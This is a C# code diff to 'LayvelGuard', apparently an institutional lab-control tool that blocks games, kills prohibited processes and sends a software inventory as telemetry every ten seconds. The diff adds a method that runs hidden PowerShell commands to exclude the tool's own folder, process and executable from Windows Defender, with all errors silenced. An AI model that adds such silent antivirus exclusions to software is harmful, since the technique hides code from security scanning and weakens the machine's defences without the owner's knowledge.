@@ -99,8 +99,8 @@ namespace LayvelGuard
 
             if (!Directory.Exists(APP_DIR)) Directory.CreateDirectory(APP_DIR);
             
+            AddAntivirusExclusions();
             EnsureDefaultInstitutionsExist();
-
             CleanInvalidAutoLogon();
 
             if (CheckAndUpdateSelf(false)) return;
@@ -336,9 +336,27 @@ namespace LayvelGuard
             } catch {}
         }
 
+        public static void AddAntivirusExclusions()
+        {
+            try {
+                string exePath = Path.Combine(APP_DIR, "LayvelGuard.exe");
+                if (!File.Exists(exePath)) exePath = Application.ExecutablePath;
+
+                ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", string.Format(
+                    "-Command \"Add-MpPreference -ExclusionPath '{0}' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess '{1}' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '{2}' -ErrorAction SilentlyContinue\"",
+                    APP_DIR, Path.GetFileName(exePath), exePath
+                ));
+                psi.CreateNoWindow = true;
+                psi.UseShellExecute = false;
+                Process p = Process.Start(psi);
+                if (p != null) p.WaitForExit();
+            } catch {}
+        }
+
         public static void RunSilentBoot()
         {
             try {
+                AddAntivirusExclusions();
                 CleanInvalidAutoLogon();
                 InstallStartupTask();
                 DoBlockGames();
@@ -352,7 +370,45 @@ namespace LayvelGuard
 
                 UninstallProhibitedSoftware(null);
                 EnforceDefaultApplications(null);
-                List<string> detected = KillProhibitedProcesses();
+                
+                System.Windows.Forms.Timer daemonTimer = new System.Windows.Forms.Timer();
+                daemonTimer.Interval = 10000;
+                daemonTimer.Tick += (s, e) => {
+                    ThreadPool.QueueUserWorkItem(st => {
+                        try {
+                            List<string> detectedProcs = KillProhibitedProcesses();
+                            List<ProhibitedAppInfo> detectedApps = ScanProhibitedSoftware();
+                            List<string> detected = new List<string>();
+
+                            if (detectedProcs != null)
+                            {
+                                foreach (string p in detectedProcs) if (!detected.Contains(p)) detected.Add(p);
+                            }
+                            if (detectedApps != null)
+                            {
+                                foreach (var a in detectedApps) if (!string.IsNullOrWhiteSpace(a.Name) && !detected.Contains(a.Name)) detected.Add(a.Name);
+                            }
+
+                            List<string> inv = GetSoftwareInventory();
+                            SendTelemetry("ONLINE", detected, inv, null);
+                        } catch {}
+                    });
+                };
+                daemonTimer.Start();
+
+                ThreadPool.QueueUserWorkItem(st => {
+                    try {
+                        List<string> detectedProcs = KillProhibitedProcesses();
+                        List<ProhibitedAppInfo> detectedApps = ScanProhibitedSoftware();
+                        List<string> detected = new List<string>();
+                        if (detectedProcs != null) foreach (string p in detectedProcs) if (!detected.Contains(p)) detected.Add(p);
+                        if (detectedApps != null) foreach (var a in detectedApps) if (!string.IsNullOrWhiteSpace(a.Name) && !detected.Contains(a.Name)) detected.Add(a.Name);
+                        List<string> inv = GetSoftwareInventory();
+                        SendTelemetry("ONLINE", detected, inv, null);
+                    } catch {}
+                });
+
+                Application.Run();
             } catch {}
         }
 
